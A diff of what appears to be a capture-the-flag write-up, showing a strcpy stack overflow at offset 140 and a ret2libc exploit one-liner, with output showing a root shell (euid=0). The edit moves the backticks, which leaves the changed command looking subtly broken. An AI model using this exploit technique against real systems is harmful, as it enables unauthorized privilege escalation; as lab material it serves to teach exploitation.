@@ -55,6 +55,8 @@ there's an strcpy call, let's try to overflow
 we overflow with an offset of 140 to the saved eip
 
 we can get system, exit and "/bin/sh" addresses to do a ret2libc attack
-./exploit_me `python -c 'print("a"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
-id
+`./exploit_me python -c 'print("a"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+we're in a shell
+#`id`
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+we are root!
